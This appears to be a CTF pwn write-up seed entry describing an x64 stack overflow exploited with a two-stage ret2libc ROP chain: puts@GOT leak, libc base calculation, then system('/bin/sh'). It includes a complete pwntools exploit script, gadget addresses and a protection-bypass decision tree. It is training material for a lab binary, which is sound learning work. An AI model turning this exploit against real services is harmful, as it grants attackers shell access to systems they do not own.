# [Seed] CTF Pwn — x64 stack overflow + ROP chain calling system

## Scenario category
CTF / binary exploitation

## Goal summary
A 64-bit ELF has an out-of-bounds `read()` that writes to a stack buffer. The local binary has NX (a non-executable stack), no PIE, and no stack canary. Use ROP gadgets to call libc `system("/bin/sh")` and get a shell.

## Full execution path

1. Basic reconnaissance
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Inspect `main` in IDA / Ghidra → find `read(0, buf, 0x100)` even though `buf` is only 0x40 bytes.
3. Calculate the overflow offset.
   ```bash
   pwndbg> cyclic 200
   # Send input to the target, then inspect RSP after the crash.
   pwndbg> cyclic -l 0x6161616c
   # Offset = 72
   ```
4. Because there is no PIE, PLT and GOT addresses are fixed.
5. First stage (without libc information): leak the `puts@GOT` contents and calculate the libc base.
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # Return to main for a second stage
   ```
6. Receive the puts output and identify the libc version with libc-database.
7. Second stage: build `system("/bin/sh")`.
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get a shell → run `cat flag`.

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The program crashed after the ROP call to system and no shell appeared | The stack was not aligned to 16 bytes (Ubuntu 18.04+ enforces this for movaps) | Add a ret gadget as padding before system | 30min |
| The exploit worked locally but not remotely | The libc versions differed | Leak one function address with puts → use libc-database to find the exact version | 40min |
| pwntools recv hung | The program used `setbuf(NULL)`, but the remote process did not flush stderr | Synchronize with sendlineafter / recvuntil | 15min |
| The remote run immediately returned SIGPIPE | The second-stage payload used the previous round's io object | Reuse the same connection after `process` / `remote`; the main process must stay alive | 20min |
| ROPgadget produced too many results | The tool lists every gadget by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain findings

- **pwntools** is the usual Python library for writing exploits (`from pwn import *`).
- **pwndbg** adds cyclic, vmmap, and heap commands to GDB.
- **ROPgadget** vs **ropper**: ropper output is easier to read and supports syscall-chain searches.
- **libc-database** matches one leaked libc function address to the exact libc version.
- **one_gadget** finds a libc gadget that can call `execve("/bin/sh")` directly, which shortens the ROP chain.

## Key code / commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # Stack-alignment gadget

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Improvement suggestions for this package

- Add `pwn-rop-cheatsheet.md` to CTF-Sandbox-Orchestrator `competition-reverse-pwn` and make this flow a template.
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest.

## Reusable patterns / script fragments

**ROP exploitation decision tree**:

```text
checksec → inspect protections
├── No NX → send shellcode directly (older approach)
├── NX + no PIE → classic ret2libc
├── NX + PIE + no Canary → leak the PIE base first → ret2libc
├── Canary present → find a way to leak the canary (format string / off-by-one)
└── Full RELRO + Canary + PIE → difficult; common options: fork without ASLR refresh / __libc_start_main / SROP
```

**Standard two-stage payload: libc leak → exploitation**:

```text
Stage 1: leak puts@GOT → calculate libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution actions
- [ ] Add a pwn quick-reference page to CTF-Sandbox-Orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to the bootstrap manifest
- [ ] Reference this case from reverse-engineering/tools-dynamic.md

## Environment information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, latest pwndbg, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTFs)
- Target architecture: x86_64

## Redaction requirements
This seed entry is based on public CTF techniques and does not involve a real challenge or closed-source system.
